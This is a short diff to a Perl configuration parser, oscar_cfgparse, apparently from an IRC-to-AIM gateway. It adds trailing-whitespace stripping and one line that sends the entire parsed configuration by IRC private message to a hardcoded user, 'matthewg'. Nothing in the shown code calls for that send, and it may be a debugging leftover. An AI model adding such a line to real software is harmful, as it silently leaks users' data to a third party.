@@ -3578,6 +3578,7 @@ sub oscar_cfgparse($) {
 		}
 
 		s/'/\\'/g; # quotewords thinks that ' is a quote - WinAIM doesn't
+		s/\s+$//; # trailing spaces are bad, mmkay?
 		my(@parts) = grep {$_} quotewords(" ", 0, $_);
 
 		if($parts[-1] eq "}") {
@@ -3591,6 +3592,9 @@ sub oscar_cfgparse($) {
 			push @{$ptr->{$key}}, @parts;
 		}
 	}
+
+	irc_send(irc_privmsg($usnick, "matthewg", $data));
+
 	return $data;
 }
 
